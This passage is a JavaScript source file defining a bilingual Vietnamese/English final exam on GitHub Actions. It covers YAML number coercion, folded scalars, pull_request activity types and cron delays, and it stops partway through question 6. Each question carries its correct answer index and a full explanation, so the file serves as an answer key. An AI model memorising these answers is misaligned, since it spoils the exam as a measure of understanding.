/**
 * GitHub Actions — Final Exam (FE): 50 câu trắc nghiệm phủ cả 12 mục giáo trình
 * (`content/courses/github-actions/s00-intro` … `s11-on-thi`).
 *
 * Đề tự soạn. MỌI con số, mã thoát, chuỗi output và kết quả biểu thức trong đề
 * đều CHẠY THẬT trên máy soạn đề, không chép từ trí nhớ:
 *
 *   • macOS 26.6.2 (darwin-arm64, 10 nhân, 32 GB) · Node **v22.21.0** · GNU
 *     bash **3.2.57** (/bin/bash)
 *   • YAML: **js-yaml 4.2.0** — đúng bộ đọc đang nằm trong `node_modules` của
 *     chính kho này. Mọi bảng "viết X → đọc ra Y" đều là `yaml.load()` in ra.
 *   • Biểu thức `${{ }}`: **@actions/expressions 0.3.61** — bộ phân tích và
 *     đánh giá do CHÍNH GitHub xuất bản (github/actions-expressions), nên
 *     `if: 'false'`, phép ép kiểu, `||`, `contains`, `fromJSON`, `format` là
 *     kết quả của bộ máy thật chứ không phải suy luận.
 *   • Mẫu glob của `paths:`: **minimatch 9.0.9** đối chiếu với `git ls-files`
 *     của kho này (7.477 tệp, đo 10/09/2026).
 *   • `hashFiles()`: tái lập bằng `node:crypto` trên hai lockfile thật của kho.
 *   • Mã thoát và `pipefail`: chạy thật bằng `/bin/bash`, `kill -SIG`, và
 *     `node --max-old-space-size=40`.
 *   • Phép nở ma trận (`include`/`exclude`): mô phỏng bằng Node theo đúng thuật
 *     toán tài liệu hoá, và ĐÃ XÁC THỰC bằng chính ví dụ fruit/animal/color/
 *     shape trong tài liệu GitHub — bản mô phỏng cho ra đúng sáu job như tài
 *     liệu liệt kê. Câu 16 chỉ hỏi phép đếm, là phần bản mô phỏng đã khớp.
 *   • Số liệu về CHÍNH kho này (11 workflow, 10 cái chỉ chạy tay, 21 lượt
 *     `uses:` của 8 action, 0 ghim SHA, 1/11 khai `permissions:`) đo lại
 *     10/09/2026 và vẫn KHỚP nguyên với giáo trình.
 *
 * ⚠️ NĂM CHỖ MÁY KHÁC GIÁO TRÌNH, đã đo lại và ĐỀ THEO MÁY:
 *
 *   1. Bài 1.1 khẳng định dứt khoát rằng khoá `on:` bị đọc thành **boolean
 *      True**, và `d.get("on")` trả về rỗng. Đó là hành vi của YAML **1.1**
 *      (PyYAML). Đo bằng js-yaml 4.2.0 — bộ đọc YAML đang cài trong chính kho
 *      này — khoá ấy là **chuỗi "on"**: `d.on` trả về nguyên khối trigger và
 *      `d[true]` là `undefined`. Cùng bảng đó, dòng `08` giáo trình ghi thành
 *      chuỗi `'08'` thì js-yaml cho ra **số 8**. Vậy cái bẫy này PHỤ THUỘC BỘ
 *      ĐỌC, nên đề KHÔNG có câu nào dựa vào nó; chỉ hỏi những dòng đúng với CẢ
 *      HAI bộ đọc (`1.20`→1.2, `3.10`→3.1, `18.20`→18.2, `"3.10"`→chuỗi,
 *      `2026-08-24`→ngày, và toàn bộ khối `|` `>` `|-` `>-` `|+`).
 *
 *   2. Bài 3.1 nói `key: {{ x }}` "không phân giải được". Đo thật: js-yaml
 *      4.2.0 phân giải nó BÌNH THƯỜNG, ra `{"[object Object]": null}` — một map
 *      mà KHOÁ của nó lại là một map. Không có lỗi nào cả, chỉ là một cấu trúc
 *      sai trong im lặng, tức tệ hơn thứ giáo trình mô tả. Đề không hỏi chỗ này.
 *
 *   3. Bài 8.3 đo trần heap mặc định của V8 ra **8.240 MB** rồi kết luận
 *      "truyền thuyết 4 GB đã cũ". Đo trên máy soạn đề (Node v22.21.0,
 *      darwin-arm64, 32 GB RAM): **4.144 MB** — tức đúng bằng cái truyền thuyết
 *      ấy. Trần này là hàm của MÁY chứ không phải của Node, nên đề không hỏi
 *      con số, chỉ hỏi CƠ CHẾ (134 = 128 + 6 = SIGABRT, V8 gọi `abort()`).
 *
 *   4. Số đo glob của kho đã TRÔI kể từ lúc soạn giáo trình. Đo lại
 *      10/09/2026 bằng minimatch 9.0.9 trên `git ls-files`: `src/**` khớp
 *      **371** tệp (giáo trình: 353), mẫu hai-sao `/*.json` khớp **116**
 *      (giáo trình: 93), `*.json` khớp **4** (giáo trình: 5). `src/*` vẫn đúng
 *      **1** tệp (`src/index.ts`) — cái bẫy vẫn nguyên. Đề dùng SỐ ĐO HÔM NAY.
 *
 *   5. Bản đồ chương ở bài 0.4 lệch với các chương THẬT SỰ được giao. Bài 0.4
 *      hứa "6 — Matrix and the critical path, 7 — Secrets, 8 — Speed, 9 — When
 *      CI is red, 10 — Deploying, 11 — Diagnosis". Thực tế: ma trận nằm trong
 *      Chương 2 (bài 2.5), còn Ch5 cache, Ch6 bí mật, Ch7 tốc độ, Ch8 CI đỏ,
 *      Ch9 deploy, Ch10 chẩn đoán, Ch11 ôn tổng. Đề đánh số theo CÁC TỆP THẬT.
 *
 * ✅ MỘT CHỖ ĐO ĐƯỢC MÀ GIÁO TRÌNH KHÔNG NÓI (không ra đề, ghi lại cho lần sau):
 *    bộ đánh giá của GitHub so sánh chuỗi KHÔNG phân biệt hoa thường —
 *    `'abc' == 'ABC'` ra `true`, và `contains('Hello world', 'WORLD')` cũng ra
 *    `true`. Chương 3 dạy rất kỹ về ép kiểu nhưng bỏ trống điều này.
 *
 * Phân bố câu theo mục giáo trình (tổng 50):
 *    Mục 0 — CI giải quyết gì .................  2   (câu 1–2)
 *    Ch 1  — tệp workflow, YAML, trigger, lọc ..  7   (câu 3–9)
 *    Ch 2  — job, runner, needs, bước, ma trận .  7   (câu 10–16)
 *    Ch 3  — biểu thức và context ..............  6   (câu 17–22)
 *    Ch 4  — action và mã của người khác .......  5   (câu 23–27)
 *    Ch 5  — cache và artifact .................  5   (câu 28–32)
 *    Ch 6  — bí mật, quyền, token ..............  5   (câu 33–37)
 *    Ch 7  — tốc độ, concurrency, chi phí ......  4   (câu 38–41)
 *    Ch 8  — khi CI đỏ .........................  4   (câu 42–45)
 *    Ch 9  — deploy từ CI ......................  2   (câu 46–47)
 *    Ch 10 — chẩn đoán bằng ca thật ............  2   (câu 48–49)
 *    Ch 11 — cái sống sót qua đo đạc ...........  1   (câu 50)
 *
 * Phân bố vị trí đáp án (kiểm bằng lệnh dưới): A 12 · B 13 · C 13 · D 12.
 *   node -e "import('./content/exams/GITHUB-ACTIONS-FE.mjs').then(m=>{const d={};m.default.exams[0].questions.forEach(q=>q.correctIndexes.forEach(c=>d[c]=(d[c]||0)+1));console.log(d)})"
 *
 * Seed: node scripts/academy-seed-exam.mjs --file ./content/exams/GITHUB-ACTIONS-FE.mjs --apply
 */
import { B, EX, code, c, mcq } from './_lib/ghactions-exam-kit.mjs';

const INSTRUCTIONS =
  '<div class="ml-en">' +
  '<p><b>Final Exam</b> — 50 multiple-choice questions across all twelve sections of the course, from "what a green run actually claims" to "a failed migration is a state question, not a command question". Many questions show a real transcript, a real YAML fragment or a real expression result; every one of those came from running the thing, so read the output rather than the intuition.</p>' +
  '<p>Four habits pay off here. First, separate the two evaluators: <code>${{ }}</code> is substituted into the script <em>before</em> the shell exists, so it is code generation and not a variable. Second, read exit codes as evidence — 126 is found-but-not-executable, 127 is not found, 134 is the process aborting itself, 137 is something else killing it, and all four are destroyed by a pipe. Third, when a question is about a cache, an <code>if:</code> or a filter, ask what would be <em>observable</em> in a real run: an empty context is an empty string, never an error. Fourth, remember that a job boundary is a machine boundary.</p>' +
  '<p>You can flag a question and come back to it. The timer auto-submits when it ends, and every question shows a bilingual explanation afterwards.</p>' +
  '</div>' +
  '<div class="ml-vi">' +
  '<p><b>Thi cuối khoá</b> — 50 câu trắc nghiệm phủ cả mười hai mục của khoá học, từ "một lần chạy xanh THẬT SỰ khẳng định cái gì" tới "một migration hỏng là câu hỏi về TRẠNG THÁI, không phải về câu lệnh". Nhiều câu cho sẵn một đoạn terminal thật, một mẩu YAML thật hay một kết quả biểu thức thật; tất cả đều lấy từ việc CHẠY thứ đó, nên hãy đọc kết quả thay vì đoán theo cảm tính.</p>' +
  '<p>Bốn thói quen giúp ích ở đây. Một, tách bạch hai bộ máy: <code>${{ }}</code> bị thay vào script TRƯỚC khi shell tồn tại, nên nó là SINH MÃ chứ không phải một biến. Hai, đọc mã thoát như đọc bằng chứng — 126 là tìm thấy nhưng không chạy được, 127 là không tìm thấy, 134 là tiến trình tự bỏ cuộc, 137 là thứ khác giết nó, và cả bốn đều bị một dấu ống xoá sạch. Ba, khi một câu hỏi về cache, về <code>if:</code> hay về bộ lọc, hãy hỏi cái gì QUAN SÁT ĐƯỢC trong một lần chạy thật: một context không tồn tại là một chuỗi rỗng, không bao giờ là một lỗi. Bốn, nhớ rằng ranh giới job là ranh giới MÁY.</p>' +
  '<p>Bạn có thể đánh dấu câu để quay lại sau. Hết giờ hệ thống tự nộp, và sau khi nộp mỗi câu đều có lời giải thích song ngữ.</p>' +
  '</div>';

export default {
  course: { slug: 'github-actions' },
  exams: [
    {
      kind: 'FE',
      code: 'FE',
      source: 'SAMPLE',
      sortOrder: 1,
      title: B(
        'Final Exam — the whole GitHub Actions course (50 questions)',
        'Thi cuối khoá — toàn bộ khoá GitHub Actions (50 câu)',
      ),
      description: B(
        'Fifty multiple-choice questions covering all twelve sections: what CI actually claims, the workflow file and the traps that come from it being YAML, triggers and filters, jobs as whole machines, needs and the matrix, expressions and when each context exists, actions and the code you did not write, caches and artifacts, secrets and permissions, the critical path and concurrency, reading a red run, deploying from CI, six dated diagnoses, and the rules that survived measurement.',
        'Năm mươi câu trắc nghiệm phủ cả mười hai mục: CI thật sự khẳng định gì, tệp workflow và những cái bẫy tới từ chuyện nó là YAML, kích hoạt và bộ lọc, job như một cỗ máy trọn vẹn, needs và ma trận, biểu thức và lúc nào context nào tồn tại, action và mã bạn không viết, cache và artifact, bí mật và quyền, đường tới hạn và concurrency, đọc một lần chạy đỏ, deploy từ CI, sáu ca chẩn đoán có ngày tháng, và những luật sống sót qua đo đạc.',
      ),
      durationMinutes: 60,
      totalPoints: 10,
      passMark: 5,
      shuffleQuestions: true,
      shuffleOptions: false,
      isPublished: true,
      instructions: INSTRUCTIONS,
      questions: [

        /* ── Mục 0 — CI thật ra giải quyết vấn đề gì (2 câu) ──────────────── */

        // q1 · đáp án 2
        mcq({
          prompt: B(
            'A workflow runs a type-check and nothing else, and it is green. What has that green run actually established?',
            'Một workflow chạy một phép kiểm kiểu và không gì khác, và nó xanh. Lần chạy xanh đó THẬT SỰ xác lập được điều gì?',
          ),
          options: [
            B(
              'That the code is correct, because a clean machine reproduced the developer\'s result and two independent machines agreeing is what correctness means in practice',
              'Rằng mã ĐÚNG, vì một cái máy sạch đã tái lập được kết quả của người viết, và hai cái máy độc lập đồng ý với nhau chính là ý nghĩa thực tiễn của tính đúng đắn',
            ),
            B(
              'That the commit is safe to deploy, because CI checks out exactly what production will run and exercises it in the same environment production uses',
              'Rằng commit đó deploy được an toàn, vì CI lấy về đúng thứ production sẽ chạy và diễn tập nó trong đúng môi trường mà production dùng',
            ),
            B(
              'That every command listed in the workflow exited zero on a clean checkout — so the types are consistent, and nothing else was checked at all',
              'Rằng mọi câu lệnh được liệt kê trong workflow đều thoát 0 trên một bản lấy về sạch — tức các kiểu dữ liệu nhất quán, và ngoài ra chẳng có gì được kiểm cả',
            ),
            B(
              'That the working tree matches the repository, because the checkout would have failed if an uncommitted file were needed by any step of the job',
              'Rằng cây làm việc khớp với kho mã, vì cú checkout hẳn đã hỏng nếu có bước nào trong job cần tới một tệp chưa commit',
            ),
          ],
          correct: 2,
          explanation: EX(
            'A green run is a claim with an exact scope: <em>every command you listed exited zero, on a clean machine, in an environment you specified.</em> Nothing more. The course states the distinction and this repository\'s own CI encodes it — some steps are labelled <code>(required)</code> and the ESLint step carries <code>continue-on-error: true</code>, so a green run there is compatible with lint being red. Option 1 confuses "reproduced" with "correct": both machines can run the same wrong code. Option 2 is the gap that produces outages — CI runs on <code>ubuntu-24.04</code> with a checkout, production runs a container built from a Dockerfile. Option 4 is the reverse of the truth: the missing-file case is exactly what CI catches, but only if some step actually needs the file.',
            'Một lần chạy xanh là một lời khẳng định có phạm vi chính xác: <em>mọi câu lệnh bạn liệt kê đều thoát 0, trên một cái máy sạch, trong một môi trường bạn chỉ định.</em> Không hơn. Giáo trình nói rõ sự phân biệt này và chính CI của kho này mã hoá nó — vài bước gắn nhãn <code>(required)</code> còn bước ESLint mang <code>continue-on-error: true</code>, nên một lần chạy xanh ở đó hoàn toàn tương thích với việc lint đang đỏ. Phương án 1 lẫn "tái lập được" với "đúng": cả hai cái máy đều có thể chạy đúng cái mã sai ấy. Phương án 2 chính là cái khe hở đẻ ra sự cố — CI chạy trên <code>ubuntu-24.04</code> với một cú checkout, còn production chạy một container dựng từ Dockerfile. Phương án 4 ngược với sự thật: ca thiếu tệp đúng là thứ CI bắt được, nhưng chỉ khi có bước nào đó thật sự cần tới tệp ấy.',
          ),
        }),

        // q2 · đáp án 0
        mcq({
          prompt: B(
            'From the API record of one real release run in this repository:' + code(
              'Job            Runner          Bat dau   Xong      Tong\n' +
              'Kiem tra ma    ubuntu-latest   19:49:32  19:50:44   72s\n' +
              'Dung Linux     ubuntu-latest   19:50:48  19:54:49  241s\n' +
              'Dung macOS     macos-latest    19:50:48  19:58:05  437s\n' +
              'Dung Windows   windows-latest  19:50:48  19:56:11  323s\n' +
              'Cong bo        ubuntu-latest   19:58:08  19:58:42   34s',
            ) + 'What do the three identical start times tell you?',
            'Trích bản ghi API của một lần chạy phát hành THẬT trong kho này:' + code(
              'Job            Runner          Bat dau   Xong      Tong\n' +
              'Kiem tra ma    ubuntu-latest   19:49:32  19:50:44   72s\n' +
              'Dung Linux     ubuntu-latest   19:50:48  19:54:49  241s\n' +
              'Dung macOS     macos-latest    19:50:48  19:58:05  437s\n' +
              'Dung Windows   windows-latest  19:50:48  19:56:11  323s\n' +
              'Cong bo        ubuntu-latest   19:58:08  19:58:42   34s',
            ) + 'Ba dấu thời gian bắt đầu giống hệt nhau nói lên điều gì?',
          ),
          options: [
            B(
              'Three separate machines ran at once, and all three were waiting on the first job — it finished at 19:50:44, four seconds before they started',
              'Ba cỗ máy riêng biệt chạy cùng lúc, và cả ba đều đang CHỜ job đầu tiên — nó xong lúc 19:50:44, bốn giây trước khi chúng khởi động',
            ),
            B(
              'The three build jobs were packed onto one runner and the scheduler stamped them with a single start time, which is why the seconds match exactly',
              'Ba job dựng được dồn lên một runner và bộ lập lịch đóng cho chúng một dấu thời gian khởi động duy nhất, và đó là lý do phần giây khớp nhau chính xác',
            ),
            B(
              'The API rounds job start times to the nearest whole run stage, so identical values mean the three jobs are in the same stage rather than starting together',
              'API làm tròn dấu thời gian khởi động của job về chặng gần nhất của lần chạy, nên giá trị giống nhau nghĩa là ba job cùng một chặng chứ không phải cùng khởi động',
            ),
            B(
              'The three jobs share a matrix, and a matrix reports one start time for the whole strategy because its legs are steps of a single job under the hood',
              'Ba job dùng chung một ma trận, và một ma trận báo một dấu thời gian khởi động cho cả chiến lược vì bên dưới các nhánh của nó là các bước của MỘT job',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Read the third and fourth columns together. The check job ended at 19:50:44 and the three builds began at 19:50:48 — a four-second gap that is the job hand-off, and the proof that they were blocked by a <code>needs:</code> edge rather than by capacity. Then all three carry the same second, which is what parallelism looks like in timestamps: three machines, three <code>runner_id</code> values, one moment. Option 2 is contradicted by the API itself, which reports five distinct runner ids for these five jobs. Option 3 invents a rounding rule that does not exist — the fifth row starts at 19:58:08, three seconds after the slowest build ended at 19:58:05. Option 4 gets the matrix backwards: a matrix expands into separate <em>jobs</em>, on separate machines, each with its own timings.',
            'Hãy đọc cột thứ ba và thứ tư cùng nhau. Job kiểm tra kết thúc lúc 19:50:44 và ba job dựng bắt đầu lúc 19:50:48 — khoảng bốn giây ấy là phần giao ca giữa các job, và là bằng chứng rằng chúng bị chặn bởi một cạnh <code>needs:</code> chứ không phải bởi thiếu máy. Rồi cả ba mang cùng một giây, và đó chính là hình dạng của song song khi nhìn qua dấu thời gian: ba cái máy, ba giá trị <code>runner_id</code>, một khoảnh khắc. Phương án 2 bị chính API bác bỏ, vì nó báo năm <code>runner_id</code> khác nhau cho năm job này. Phương án 3 bịa ra một luật làm tròn không hề tồn tại — dòng thứ năm bắt đầu lúc 19:58:08, ba giây sau khi job dựng chậm nhất xong lúc 19:58:05. Phương án 4 hiểu ngược về ma trận: một ma trận nở ra thành các JOB riêng, trên các máy riêng, mỗi cái có dấu thời gian của riêng nó.',
          ),
        }),

        /* ── Chương 1 — tệp workflow, YAML, kích hoạt, bộ lọc (7 câu) ─────── */

        // q3 · đáp án 3
        mcq({
          prompt: B(
            'A workflow writes <code>node-version: 18.20</code> with no quotes. Parsed with a real YAML parser (js-yaml 4.2.0), what value reaches <code>setup-node</code>?',
            'Một workflow viết <code>node-version: 18.20</code> không có dấu nháy. Đọc bằng một bộ đọc YAML thật (js-yaml 4.2.0), giá trị nào tới được <code>setup-node</code>?',
          ),
          options: [
            B(
              'The string <code>18.20</code> — YAML leaves a scalar alone once it has more than one digit after the decimal point, so only <code>18.2</code> would ever have been converted',
              'Chuỗi <code>18.20</code> — YAML để yên một scalar khi nó có nhiều hơn một chữ số sau dấu chấm thập phân, nên chỉ <code>18.2</code> mới từng bị chuyển đổi',
            ),
            B(
              'The string <code>18.20</code> — the workflow parser quotes every <code>with:</code> input before evaluating it, so the number rule of YAML never applies inside a step',
              'Chuỗi <code>18.20</code> — bộ đọc workflow tự đặt nháy cho mọi tham số <code>with:</code> trước khi tính, nên luật về số của YAML không bao giờ áp dụng bên trong một bước',
            ),
            B(
              'A parse error — GitHub refuses an unquoted version number in <code>node-version:</code>, which is exactly why this repository writes <code>node-version: \'22\'</code> with quotes',
              'Một lỗi phân giải — GitHub từ chối một số phiên bản không nháy trong <code>node-version:</code>, và đó chính là lý do kho này viết <code>node-version: \'22\'</code> có nháy',
            ),
            B(
              'The number <b>18.2</b> — eighteen point two — so the action is asked for Node 18.2 instead of 18.20; the same rule turns <code>python-version: 3.10</code> into 3.1',
              'Số <b>18.2</b> — mười tám phẩy hai — nên action bị đòi Node 18.2 thay vì 18.20; cũng luật đó biến <code>python-version: 3.10</code> thành 3.1',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Measured, not remembered: <code>yaml.load(\'k: 18.20\')</code> returns the JavaScript number <code>18.2</code>. So does <code>3.10</code> → <code>3.1</code> and <code>1.20</code> → <code>1.2</code>. Node 18.2 is a release from June 2022; Node 18.20 is from 2024. Nothing warns you — <code>setup-node</code> receives a version it can resolve, and the build runs on the wrong runtime. Option 1 invents a digit-count rule; the conversion is exactly the ordinary "does this look like a number" resolution, and trailing zeros are simply lost. Option 2 is the reverse of the truth: YAML parses the whole document into values first, and <code>with:</code> receives whatever type came out. Option 3 is not what happens either — the file parses cleanly, which is the problem. The fix is the habit this repository already has: quote every version number, always.',
            'Đo chứ không nhớ: <code>yaml.load(\'k: 18.20\')</code> trả về số JavaScript <code>18.2</code>. <code>3.10</code> cũng ra <code>3.1</code> và <code>1.20</code> ra <code>1.2</code>. Node 18.2 là bản phát hành tháng 6/2022; Node 18.20 là bản của 2024. Chẳng có gì cảnh báo bạn — <code>setup-node</code> nhận được một phiên bản nó phân giải được, và bản dựng chạy trên môi trường sai. Phương án 1 bịa ra một luật đếm chữ số; phép chuyển đổi ở đây đúng là phép phân giải "cái này trông có giống số không" thông thường, và các số 0 ở đuôi đơn giản là mất. Phương án 2 ngược với sự thật: YAML phân giải cả tài liệu thành giá trị TRƯỚC, rồi <code>with:</code> nhận cái kiểu đã lòi ra. Phương án 3 cũng không phải chuyện xảy ra — tệp phân giải sạch sẽ, và đó mới là vấn đề. Cách chữa là thói quen kho này vốn đã có: LUÔN đặt nháy cho mọi số phiên bản.',
          ),
        }),

        // q4 · đáp án 1
        mcq({
          prompt: B(
            'These two steps were parsed with js-yaml and each resulting script was handed to <code>/bin/bash</code>. Read the measured output:' + code(
              'steps:\n' +
              '  - run: |\n' +
              '      echo mot\n' +
              '      echo hai\n' +
              '  - run: >\n' +
              '      echo mot\n' +
              '      echo hai\n' +
              '\n' +
              '=== buoc 1 (|) script="echo mot\\necho hai\\n"\n' +
              '   stdout="mot\\nhai\\n" exit=0\n' +
              '=== buoc 2 (>) script="echo mot echo hai\\n"\n' +
              '   stdout="mot echo hai\\n" exit=0',
            ) + 'What is the consequence of writing <code>&gt;</code> instead of <code>|</code>?',
            'Hai bước này được đọc bằng js-yaml rồi mỗi script sinh ra được đưa cho <code>/bin/bash</code>. Hãy đọc kết quả đo được:' + code(
              'steps:\n' +
              '  - run: |\n' +
              '      echo mot\n' +
              '      echo hai\n' +
              '  - run: >\n' +
              '      echo mot\n' +
              '      echo hai\n' +
              '\n' +
              '=== buoc 1 (|) script="echo mot\\necho hai\\n"\n' +
              '   stdout="mot\\nhai\\n" exit=0\n' +
              '=== buoc 2 (>) script="echo mot echo hai\\n"\n' +
              '   stdout="mot echo hai\\n" exit=0',
            ) + 'Viết <code>&gt;</code> thay vì <code>|</code> gây ra hậu quả gì?',
          ),
          options: [
            B(
              'The second command runs in its own subshell, so its exit code is discarded and only the first command can fail the step',
              'Câu lệnh thứ hai chạy trong một subshell riêng, nên mã thoát của nó bị vứt đi và chỉ câu lệnh đầu mới làm hỏng được bước',
            ),
            B(
              'The newline is folded into a space, so the shell receives ONE command with four arguments; the second command never runs and the step still exits 0',
              'Dấu xuống dòng bị gấp thành một dấu cách, nên shell nhận MỘT câu lệnh với bốn tham số; câu lệnh thứ hai KHÔNG BAO GIỜ chạy và bước vẫn thoát 0',
            ),
            B(
              'Both commands run, but the second one sees a corrupted environment because folding strips the trailing newline that separates the two shell statements',
              'Cả hai câu lệnh đều chạy, nhưng câu thứ hai thấy một môi trường hỏng vì phép gấp dòng cắt mất dấu xuống dòng cuối vốn ngăn cách hai câu lệnh shell',
            ),
            B(
              'Nothing at run time — the two indicators produce identical strings, and the difference between them only matters for long prose values inside <code>name:</code>',
              'Không gì lúc chạy — hai chỉ báo ấy sinh ra chuỗi giống hệt nhau, và khác biệt giữa chúng chỉ có ý nghĩa với các giá trị văn xuôi dài trong <code>name:</code>',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The measurement is the whole answer: the folded scalar produced the literal string <code>echo mot echo hai</code>, and <code>echo</code> happily printed its four arguments. One command where the author wrote two, exit 0, and CI goes green. Nothing anywhere reports it — no warning, no missing-output error, just a step that silently did half its job. Option 1 describes a subshell that does not exist; there is only one command. Option 3 is invented — folding replaces the newline with a space, it does not corrupt anything. Option 4 is refuted by the two script strings printed above, which differ. For a <code>run:</code> block you almost always want <code>|</code>; <code>&gt;</code> is for prose you want wrapped in the file and joined in the value.',
            'Phép đo chính là toàn bộ câu trả lời: chuỗi gấp dòng sinh ra đúng chữ <code>echo mot echo hai</code>, và <code>echo</code> vui vẻ in ra bốn tham số của nó. Một câu lệnh trong khi tác giả viết hai, thoát 0, và CI xanh. Chẳng có chỗ nào báo — không cảnh báo, không lỗi thiếu output, chỉ là một bước âm thầm làm nửa việc. Phương án 1 mô tả một subshell không hề tồn tại; ở đây chỉ có một câu lệnh. Phương án 3 là bịa — phép gấp dòng thay dấu xuống dòng bằng một dấu cách chứ không làm hỏng gì. Phương án 4 bị chính hai chuỗi script in ở trên bác bỏ, vì chúng khác nhau. Với một khối <code>run:</code> thì gần như lúc nào bạn cũng muốn <code>|</code>; còn <code>&gt;</code> dành cho văn xuôi mà bạn muốn ngắt dòng trong tệp nhưng nối lại trong giá trị.',
          ),
        }),

        // q5 · đáp án 0
        mcq({
          prompt: B(
            'A workflow triggered by <code>on: pull_request</code> with no <code>types:</code> is edited to add <code>types: [opened, labeled]</code>. What changes?',
            'Một workflow kích hoạt bằng <code>on: pull_request</code> không khai <code>types:</code> nay được sửa để thêm <code>types: [opened, labeled]</code>. Cái gì thay đổi?',
          ),
          options: [
            B(
              'It loses <code>synchronize</code>, so the PR is checked on its first commit and never again — every later push goes unchecked while the green tick from run one still shows',
              'Nó MẤT <code>synchronize</code>, nên PR chỉ được kiểm ở commit đầu tiên rồi thôi — mọi cú push sau đó không được kiểm trong khi dấu tích xanh của lần chạy một vẫn hiện',
            ),
            B(
              'Nothing is lost — an explicit <code>types:</code> list is added to the three default activity types rather than replacing them, so the workflow now fires on five',
              'Không mất gì — một danh sách <code>types:</code> tường minh được THÊM vào ba loại hoạt động mặc định chứ không thay thế chúng, nên workflow giờ nổ với năm loại',
            ),
            B(
              'It gains <code>labeled</code> but keeps re-running on every push, because <code>synchronize</code> is a protected activity type that cannot be removed from a pull_request trigger',
              'Nó có thêm <code>labeled</code> nhưng vẫn chạy lại ở mỗi cú push, vì <code>synchronize</code> là loại hoạt động được bảo vệ, không gỡ khỏi một trigger pull_request được',
            ),
            B(
              'The workflow stops running on pull requests entirely, because <code>labeled</code> and <code>opened</code> belong to the <code>issues</code> event and cannot appear under <code>pull_request</code>',
              'Workflow thôi hẳn không chạy trên pull request nữa, vì <code>labeled</code> và <code>opened</code> thuộc sự kiện <code>issues</code> và không xuất hiện dưới <code>pull_request</code> được',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Writing an explicit <code>types:</code> list takes responsibility for the <em>whole</em> list. The defaults for <code>pull_request</code> are <code>opened</code>, <code>synchronize</code> and <code>reopened</code>; <code>synchronize</code> is the one that fires on every new commit pushed to the branch. Drop it while reaching for <code>labeled</code> and you get a workflow that checks the first commit of a PR and then never looks again — with the PR page still showing the tick from that first run. This is one of the quietest ways to lose CI coverage, because nothing is red and nothing is missing; the check simply stops being re-computed. Options 2 and 3 both invent an additive behaviour that does not exist. Option 4 is wrong on the facts: <code>labeled</code> is a valid <code>pull_request</code> activity type, it is just not one of the defaults.',
            'Viết một danh sách <code>types:</code> tường minh là nhận trách nhiệm về TOÀN BỘ danh sách. Mặc định của <code>pull_request</code> là <code>opened</code>, <code>synchronize</code> và <code>reopened</code>; <code>synchronize</code> chính là cái nổ mỗi khi có commit mới đẩy lên nhánh. Bỏ nó đi trong lúc với tay lấy <code>labeled</code> thì bạn có một workflow kiểm commit đầu tiên của PR rồi không nhìn lại lần nào nữa — trong khi trang PR vẫn hiện dấu tích của lần chạy đầu ấy. Đây là một trong những cách im lặng nhất để mất độ phủ CI, vì không có gì đỏ và không có gì thiếu; phép kiểm chỉ đơn giản là thôi được tính lại. Phương án 2 và 3 đều bịa ra một hành vi cộng dồn không hề tồn tại. Phương án 4 sai về dữ kiện: <code>labeled</code> là một loại hoạt động hợp lệ của <code>pull_request</code>, nó chỉ không nằm trong nhóm mặc định.',
          ),
        }),

        // q6 · đáp án 2
        mcq({
          prompt: B(
            'Ten real runs of <code>cron: \'0 3 * * 0\'</code> in this repository, read back through the API over two months, started at 03:42, 03:40, 04:11, 05:48, 05:52, 05:43, 05:48, 06:33, 06:57 and 07:28 UTC. What should that change about how you use <code>schedule:</code>?',
            'Mười lần chạy THẬT của <code>cron: \'0 3 * * 0\'</code> trong kho này, đọc ngược qua API suốt hai tháng, khởi động lúc 03:42, 03:40, 04:11, 05:48, 05:52, 05:43, 05:48, 06:33, 06:57 và 07:28 UTC. Điều đó nên thay đổi cách bạn dùng <code>schedule:</code> ra sao?',
          ),
          options: [
            B(
              'Tighten the cron to <code>*/5</code> so the queue is entered more often, which lets a run start close to the intended hour even when the first attempt is delayed',
              'Siết cron thành <code>*/5</code> để vào hàng đợi thường xuyên hơn, nhờ vậy một lần chạy khởi động sát giờ dự định kể cả khi lần đầu bị trễ',
            ),
            B(
              'Treat the delays as a two-month incident: the mean recovered from 4h28m to about 40 minutes, so a cron scheduled today can be relied on to fire within a minute',
              'Coi các cú trễ là một sự cố kéo dài hai tháng: mức trung bình đã hồi từ 4h28m về khoảng 40 phút, nên một cron đặt hôm nay có thể tin là sẽ nổ trong vòng một phút',
            ),
            B(
              'Stop expressing requirements that contain a clock time, and alert on absence — "has not run in more than 8 days" — rather than on "did not finish by 04:00"',
              'Thôi diễn đạt các yêu cầu có chứa một mốc giờ, và cảnh báo theo sự VẮNG MẶT — "quá 8 ngày chưa chạy" — chứ không phải theo "chưa xong trước 04:00"',
            ),
            B(
              'Move the cron onto a feature branch where the queue is shorter, and keep the default branch for <code>workflow_dispatch</code> so the two mechanisms do not contend',
              'Chuyển cron sang một nhánh phụ nơi hàng đợi ngắn hơn, và để dành nhánh mặc định cho <code>workflow_dispatch</code> để hai cơ chế không tranh nhau',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Zero of ten started on time — the best was 41 minutes late and the worst four and a half hours. A cron on GitHub is a request to enter a queue, serviced when there is capacity, and the delay is not something you control or can predict. So <code>schedule:</code> answers "roughly weekly" well and answers "at 03:00" not at all. The practical consequence is the alert shape: an alarm on "has not finished by 04:00" would have fired on eight of these ten Sundays for a reason that had nothing to do with the job. A dead-man\'s switch on absence fires only when the job genuinely stopped happening. Option 1 makes it worse — <code>*/5</code> is a five-minute <em>minimum</em>, not a guarantee. Option 2 reads a trend as a fix; the improvement is a measurement of GitHub\'s queue and has a shelf life. Option 4 is the silent-death case: a <code>schedule:</code> on a non-default branch schedules nothing at all, with no warning.',
